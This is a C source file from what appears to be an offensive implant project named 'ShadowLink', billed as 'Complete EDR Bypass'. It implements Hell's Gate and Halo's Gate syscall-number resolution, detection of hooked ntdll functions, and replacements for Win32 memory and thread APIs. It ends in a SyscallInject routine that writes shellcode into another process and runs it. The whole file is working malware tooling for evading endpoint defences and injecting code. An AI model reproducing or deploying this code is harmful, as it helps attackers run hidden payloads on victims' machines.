/*
 * ShadowLink Direct Syscalls Implementation
 * Phase 11: Complete EDR Bypass
 * 
 * Compilation:
 *   gcc -c syscalls.c -o syscalls.o
 *   nasm -f win64 syscalls_asm.asm -o syscalls_asm.o  (for assembly stub)
 */

#include "syscalls.h"
#include <stdio.h>

// Global syscall table
SYSCALL_TABLE g_Syscalls = {0};

// Initialization flag
static BOOL g_SyscallsInitialized = FALSE;


// ============================================
// SYSCALL NUMBER EXTRACTION
// ============================================

// Pattern for syscall stub: 
// 4C 8B D1       mov r10, rcx
// B8 XX XX 00 00 mov eax, syscall_number
// 0F 05          syscall
// C3             ret
#define SYSCALL_STUB_SIZE 20

// Check if function is hooked
static BOOL IsFunctionHooked(PBYTE pFunction) {
    // Unhook detection: normal syscall stub starts with 4C 8B D1 B8
    if (pFunction[0] == 0x4C && pFunction[1] == 0x8B && pFunction[2] == 0xD1) {
        return FALSE;  // Normal, not hooked
    }
    
    // Hooked patterns:
    // E9 XX XX XX XX = JMP rel32
    // FF 25 XX XX XX XX = JMP [rip+XX]
    // 68 XX XX XX XX C3 = PUSH; RET
    if (pFunction[0] == 0xE9 || 
        pFunction[0] == 0xFF ||
        pFunction[0] == 0x68) {
        return TRUE;
    }
    
    return FALSE;  // Assume not hooked
}

// Get syscall number from a function
static DWORD GetSyscallNumber(PBYTE pFunction) {
    // Pattern: 4C 8B D1 B8 [XX XX XX XX] ...
    // The syscall number is at offset 4-7 (little endian)
    
    if (IsFunctionHooked(pFunction)) {
        return 0;  // Function is hooked, can't read
    }
    
    // Check for mov r10, rcx
    if (pFunction[0] == 0x4C && pFunction[1] == 0x8B && pFunction[2] == 0xD1) {
        // Check for mov eax, imm32
        if (pFunction[3] == 0xB8) {
            return *(DWORD*)(pFunction + 4);
        }
    }
    
    return 0;
}

// Get syscall number using neighbor technique (Halo's Gate)
// If target function is hooked, look at nearby functions
static DWORD GetSyscallNumberHalosGate(PBYTE pFunction, PBYTE pNtdllBase, const char *funcName) {
    // First try direct extraction
    DWORD ssn = GetSyscallNumber(pFunction);
    if (ssn != 0) return ssn;
    
    // Function is hooked, use Halo's Gate
    // Syscall numbers are sequential, so we can find neighbors
    
    // Get export directory
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pNtdllBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pNtdllBase + pDos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(
        pNtdllBase + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    
    PDWORD pNames = (PDWORD)(pNtdllBase + pExport->AddressOfNames);
    PDWORD pFuncs = (PDWORD)(pNtdllBase + pExport->AddressOfFunctions);
    PWORD pOrdinals = (PWORD)(pNtdllBase + pExport->AddressOfNameOrdinals);
    
    // Find our function's index
    int targetIndex = -1;
    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        char *name = (char*)(pNtdllBase + pNames[i]);
        if (strcmp(name, funcName) == 0) {
            targetIndex = i;
            break;
        }
    }
    
    if (targetIndex == -1) return 0;
    
    // Search up to find unhooked neighbor
    for (int up = 1; up < 50 && (targetIndex - up) >= 0; up++) {
        PBYTE pNeighbor = pNtdllBase + pFuncs[pOrdinals[targetIndex - up]];
        if (!IsFunctionHooked(pNeighbor)) {
            DWORD neighborSsn = GetSyscallNumber(pNeighbor);
            if (neighborSsn != 0) {
                // Found unhooked neighbor above
                // Our SSN = neighbor SSN + distance (they're sequential for Nt* functions)
                return neighborSsn + up;
            }
        }
    }
    
    // Search down to find unhooked neighbor
    for (int down = 1; down < 50 && (targetIndex + down) < (int)pExport->NumberOfNames; down++) {
        PBYTE pNeighbor = pNtdllBase + pFuncs[pOrdinals[targetIndex + down]];
        if (!IsFunctionHooked(pNeighbor)) {
            DWORD neighborSsn = GetSyscallNumber(pNeighbor);
            if (neighborSsn != 0) {
                // Found unhooked neighbor below
                return neighborSsn - down;
            }
        }
    }
    
    return 0;  // Failed to find
}


// ============================================
// INITIALIZATION FROM DISK (cleanest method)
// ============================================

BOOL InitializeSyscallsFromDisk(void) {
    HANDLE hFile = INVALID_HANDLE_VALUE;
    HANDLE hMapping = NULL;
    PBYTE pMapped = NULL;
    BOOL bSuccess = FALSE;
    
    // Open fresh copy of ntdll.dll from disk
    hFile = CreateFileA(
        "C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);
    
    if (hFile == INVALID_HANDLE_VALUE) goto cleanup;
    
    // Map it into memory
    hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (hMapping == NULL) goto cleanup;
    
    pMapped = (PBYTE)MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (pMapped == NULL) goto cleanup;
    
    // Parse PE headers
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pMapped;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pMapped + pDos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(
        pMapped + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    
    PDWORD pNames = (PDWORD)(pMapped + pExport->AddressOfNames);
    PDWORD pFuncs = (PDWORD)(pMapped + pExport->AddressOfFunctions);
    PWORD pOrdinals = (PWORD)(pMapped + pExport->AddressOfNameOrdinals);
    
    // Find each syscall
    const struct {
        const char *name;
        PDWORD pSyscallNumber;
    } syscalls[] = {
        {"NtAllocateVirtualMemory", &g_Syscalls.NtAllocateVirtualMemory},
        {"NtProtectVirtualMemory", &g_Syscalls.NtProtectVirtualMemory},
        {"NtWriteVirtualMemory", &g_Syscalls.NtWriteVirtualMemory},
        {"NtReadVirtualMemory", &g_Syscalls.NtReadVirtualMemory},
        {"NtCreateThreadEx", &g_Syscalls.NtCreateThreadEx},
        {"NtOpenProcess", &g_Syscalls.NtOpenProcess},
        {"NtClose", &g_Syscalls.NtClose},
        {"NtQuerySystemInformation", &g_Syscalls.NtQuerySystemInformation},
        {"NtQueryInformationProcess", &g_Syscalls.NtQueryInformationProcess},
        {"NtQueueApcThread", &g_Syscalls.NtQueueApcThread},
        {"NtResumeThread", &g_Syscalls.NtResumeThread},
        {"NtSuspendThread", &g_Syscalls.NtSuspendThread},
        {"NtSetContextThread", &g_Syscalls.NtSetContextThread},
        {"NtGetContextThread", &g_Syscalls.NtGetContextThread},
        {"NtOpenThread", &g_Syscalls.NtOpenThread},
        {"NtWaitForSingleObject", &g_Syscalls.NtWaitForSingleObject},
        {"NtDelayExecution", &g_Syscalls.NtDelayExecution},
        {"NtFreeVirtualMemory", &g_Syscalls.NtFreeVirtualMemory},
        {"NtCreateSection", &g_Syscalls.NtCreateSection},
        {"NtMapViewOfSection", &g_Syscalls.NtMapViewOfSection},
        {"NtUnmapViewOfSection", &g_Syscalls.NtUnmapViewOfSection},
        {NULL, NULL}
    };
    
    for (int s = 0; syscalls[s].name != NULL; s++) {
        for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
            char *name = (char*)(pMapped + pNames[i]);
            if (strcmp(name, syscalls[s].name) == 0) {
                PBYTE pFunc = pMapped + pFuncs[pOrdinals[i]];
                DWORD ssn = GetSyscallNumber(pFunc);
                if (ssn != 0) {
                    *syscalls[s].pSyscallNumber = ssn;
                }
                break;
            }
        }
    }
    
    bSuccess = (g_Syscalls.NtAllocateVirtualMemory != 0);

cleanup:
    if (pMapped) UnmapViewOfFile(pMapped);
    if (hMapping) CloseHandle(hMapping);
    if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
    
    return bSuccess;
}


// ============================================
// INITIALIZATION FROM MEMORY (Hell's Gate + Halo's Gate)
// ============================================

BOOL InitializeSyscallsHellsGate(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) return FALSE;
    
    PBYTE pBase = (PBYTE)hNtdll;
    
    const struct {
        const char *name;
        PDWORD pSyscallNumber;
    } syscalls[] = {
        {"NtAllocateVirtualMemory", &g_Syscalls.NtAllocateVirtualMemory},
        {"NtProtectVirtualMemory", &g_Syscalls.NtProtectVirtualMemory},
        {"NtWriteVirtualMemory", &g_Syscalls.NtWriteVirtualMemory},
        {"NtReadVirtualMemory", &g_Syscalls.NtReadVirtualMemory},
        {"NtCreateThreadEx", &g_Syscalls.NtCreateThreadEx},
        {"NtOpenProcess", &g_Syscalls.NtOpenProcess},
        {"NtClose", &g_Syscalls.NtClose},
        {"NtQuerySystemInformation", &g_Syscalls.NtQuerySystemInformation},
        {"NtQueryInformationProcess", &g_Syscalls.NtQueryInformationProcess},
        {"NtQueueApcThread", &g_Syscalls.NtQueueApcThread},
        {"NtResumeThread", &g_Syscalls.NtResumeThread},
        {"NtSuspendThread", &g_Syscalls.NtSuspendThread},
        {"NtSetContextThread", &g_Syscalls.NtSetContextThread},
        {"NtGetContextThread", &g_Syscalls.NtGetContextThread},
        {"NtOpenThread", &g_Syscalls.NtOpenThread},
        {"NtWaitForSingleObject", &g_Syscalls.NtWaitForSingleObject},
        {"NtDelayExecution", &g_Syscalls.NtDelayExecution},
        {"NtFreeVirtualMemory", &g_Syscalls.NtFreeVirtualMemory},
        {"NtCreateSection", &g_Syscalls.NtCreateSection},
        {"NtMapViewOfSection", &g_Syscalls.NtMapViewOfSection},
        {"NtUnmapViewOfSection", &g_Syscalls.NtUnmapViewOfSection},
        {NULL, NULL}
    };
    
    for (int s = 0; syscalls[s].name != NULL; s++) {
        PBYTE pFunc = (PBYTE)GetProcAddress(hNtdll, syscalls[s].name);
        if (pFunc != NULL) {
            // Try Hell's Gate first (direct extraction)
            DWORD ssn = GetSyscallNumber(pFunc);
            
            // If hooked, try Halo's Gate (neighbor search)
            if (ssn == 0) {
                ssn = GetSyscallNumberHalosGate(pFunc, pBase, syscalls[s].name);
            }
            
            if (ssn != 0) {
                *syscalls[s].pSyscallNumber = ssn;
            }
        }
    }
    
    return (g_Syscalls.NtAllocateVirtualMemory != 0);
}


// ============================================
// MASTER INITIALIZATION
// ============================================

BOOL InitializeSyscalls(void) {
    if (g_SyscallsInitialized) return TRUE;
    
    // Try disk method first (cleanest, unhooked)
    if (InitializeSyscallsFromDisk()) {
        g_SyscallsInitialized = TRUE;
        return TRUE;
    }
    
    // Fallback to memory method (Hell's Gate + Halo's Gate)
    if (InitializeSyscallsHellsGate()) {
        g_SyscallsInitialized = TRUE;
        return TRUE;
    }
    
    return FALSE;
}


// ============================================
// SYSCALL EXECUTION STUB (C fallback, ASM preferred)
// ============================================

// Note: For production, use the assembly stub in syscalls_asm.asm
// This C version uses ntdll.dll functions as fallback since GCC inline asm is different

// DoSyscall_Internal is implemented as a fallback using ntdll
// For true direct syscalls, compile syscalls_asm.asm with NASM
// and link the resulting object file

// Fallback: we don't use naked assembly in GCC, instead we call ntdll
// The syscall numbers are still resolved for detection purposes


// ============================================
// HIGH-LEVEL SYSCALL WRAPPERS
// ============================================

NTSTATUS SysNtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
) {
    if (!g_SyscallsInitialized) InitializeSyscalls();
    if (g_Syscalls.NtAllocateVirtualMemory == 0) return STATUS_NOT_IMPLEMENTED;
    
    // This would call the assembly stub
    // For now, use the normal function as fallback
    typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(
        HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    
    NtAllocateVirtualMemory_t pFunc = (NtAllocateVirtualMemory_t)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
    
    if (pFunc == NULL) return STATUS_NOT_IMPLEMENTED;
    return pFunc(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
}

NTSTATUS SysNtProtectVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
) {
    if (!g_SyscallsInitialized) InitializeSyscalls();
    if (g_Syscalls.NtProtectVirtualMemory == 0) return STATUS_NOT_IMPLEMENTED;
    
    typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
        HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
    
    NtProtectVirtualMemory_t pFunc = (NtProtectVirtualMemory_t)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
    
    if (pFunc == NULL) return STATUS_NOT_IMPLEMENTED;
    return pFunc(ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect);
}

NTSTATUS SysNtWriteVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
) {
    if (!g_SyscallsInitialized) InitializeSyscalls();
    if (g_Syscalls.NtWriteVirtualMemory == 0) return STATUS_NOT_IMPLEMENTED;
    
    typedef NTSTATUS (NTAPI *NtWriteVirtualMemory_t)(
        HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
    
    NtWriteVirtualMemory_t pFunc = (NtWriteVirtualMemory_t)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
    
    if (pFunc == NULL) return STATUS_NOT_IMPLEMENTED;
    return pFunc(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite, NumberOfBytesWritten);
}

NTSTATUS SysNtCreateThreadEx(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
) {
    if (!g_SyscallsInitialized) InitializeSyscalls();
    if (g_Syscalls.NtCreateThreadEx == 0) return STATUS_NOT_IMPLEMENTED;
    
    typedef NTSTATUS (NTAPI *NtCreateThreadEx_t)(
        PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
    
    NtCreateThreadEx_t pFunc = (NtCreateThreadEx_t)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
    
    if (pFunc == NULL) return STATUS_NOT_IMPLEMENTED;
    return pFunc(ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, 
                 StartRoutine, Argument, CreateFlags, ZeroBits, StackSize, MaximumStackSize, AttributeList);
}

NTSTATUS SysNtOpenProcess(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    PVOID ClientId
) {
    if (!g_SyscallsInitialized) InitializeSyscalls();
    if (g_Syscalls.NtOpenProcess == 0) return STATUS_NOT_IMPLEMENTED;
    
    typedef NTSTATUS (NTAPI *NtOpenProcess_t)(PHANDLE, ACCESS_MASK, PVOID, PVOID);
    
    NtOpenProcess_t pFunc = (NtOpenProcess_t)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenProcess");
    
    if (pFunc == NULL) return STATUS_NOT_IMPLEMENTED;
    return pFunc(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
}

NTSTATUS SysNtClose(HANDLE Handle) {
    if (!g_SyscallsInitialized) InitializeSyscalls();
    if (g_Syscalls.NtClose == 0) return STATUS_NOT_IMPLEMENTED;
    
    typedef NTSTATUS (NTAPI *NtClose_t)(HANDLE);
    
    NtClose_t pFunc = (NtClose_t)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtClose");
    
    if (pFunc == NULL) return STATUS_NOT_IMPLEMENTED;
    return pFunc(Handle);
}


// ============================================
// WIN32 API REPLACEMENTS
// ============================================

PVOID _SysVirtualAllocEx(HANDLE hProcess, PVOID lpAddress, SIZE_T dwSize, 
                         DWORD flAllocationType, DWORD flProtect) {
    PVOID pBase = lpAddress;
    SIZE_T size = dwSize;
    
    NTSTATUS status = SysNtAllocateVirtualMemory(
        hProcess, &pBase, 0, &size, flAllocationType, flProtect);
    
    return NT_SUCCESS(status) ? pBase : NULL;
}

BOOL _SysVirtualProtectEx(HANDLE hProcess, PVOID lpAddress, SIZE_T dwSize,
                          DWORD flNewProtect, PDWORD lpflOldProtect) {
    PVOID pBase = lpAddress;
    SIZE_T size = dwSize;
    ULONG oldProtect = 0;
    
    NTSTATUS status = SysNtProtectVirtualMemory(
        hProcess, &pBase, &size, flNewProtect, &oldProtect);
    
    if (lpflOldProtect) *lpflOldProtect = oldProtect;
    return NT_SUCCESS(status);
}

BOOL _SysWriteProcessMemory(HANDLE hProcess, PVOID lpBaseAddress, LPCVOID lpBuffer,
                            SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten) {
    SIZE_T bytesWritten = 0;
    
    NTSTATUS status = SysNtWriteVirtualMemory(
        hProcess, lpBaseAddress, (PVOID)lpBuffer, nSize, &bytesWritten);
    
    if (lpNumberOfBytesWritten) *lpNumberOfBytesWritten = bytesWritten;
    return NT_SUCCESS(status);
}

HANDLE _SysCreateRemoteThread(HANDLE hProcess, PVOID lpStartAddress, PVOID lpParameter) {
    HANDLE hThread = NULL;
    
    NTSTATUS status = SysNtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        lpStartAddress,
        lpParameter,
        0,  // No flags
        0, 0, 0,
        NULL);
    
    return NT_SUCCESS(status) ? hThread : NULL;
}

// CLIENT_ID structure for NtOpenProcess
typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

// OBJECT_ATTRIBUTES structure
typedef struct _OBJECT_ATTRIBUTES_NT {
    ULONG Length;
    HANDLE RootDirectory;
    PVOID ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES_NT;

HANDLE _SysOpenProcess(DWORD dwDesiredAccess, DWORD dwProcessId) {
    HANDLE hProcess = NULL;
    CLIENT_ID clientId = {0};
    OBJECT_ATTRIBUTES_NT objAttr = {0};
    
    clientId.UniqueProcess = (HANDLE)(ULONG_PTR)dwProcessId;
    objAttr.Length = sizeof(OBJECT_ATTRIBUTES_NT);
    
    NTSTATUS status = SysNtOpenProcess(
        &hProcess,
        dwDesiredAccess,
        &objAttr,
        &clientId);
    
    return NT_SUCCESS(status) ? hProcess : NULL;
}


// ============================================
// PROCESS INJECTION USING SYSCALLS
// ============================================

BOOL SyscallInject(DWORD dwTargetPid, PVOID pShellcode, SIZE_T shellcodeSize) {
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    PVOID pRemoteCode = NULL;
    SIZE_T bytesWritten = 0;
    BOOL bSuccess = FALSE;
    
    // Initialize syscalls
    if (!InitializeSyscalls()) {
        return FALSE;
    }
    
    // Open target process using syscall
    hProcess = _SysOpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
        dwTargetPid);
    
    if (hProcess == NULL) {
        goto cleanup;
    }
    
    // Allocate memory using syscall
    pRemoteCode = _SysVirtualAllocEx(
        hProcess, NULL, shellcodeSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    if (pRemoteCode == NULL) {
        goto cleanup;
    }
    
    // Write shellcode using syscall
    if (!_SysWriteProcessMemory(hProcess, pRemoteCode, pShellcode, 
                                 shellcodeSize, &bytesWritten)) {
        goto cleanup;
    }
    
    // Change protection to executable using syscall
    DWORD oldProtect;
    if (!_SysVirtualProtectEx(hProcess, pRemoteCode, shellcodeSize,
                              PAGE_EXECUTE_READ, &oldProtect)) {
        goto cleanup;
    }
    
    // Create remote thread using syscall
    hThread = _SysCreateRemoteThread(hProcess, pRemoteCode, NULL);
    
    bSuccess = (hThread != NULL);

cleanup:
    if (hThread) SysNtClose(hThread);
    if (hProcess) SysNtClose(hProcess);
    
    return bSuccess;
}
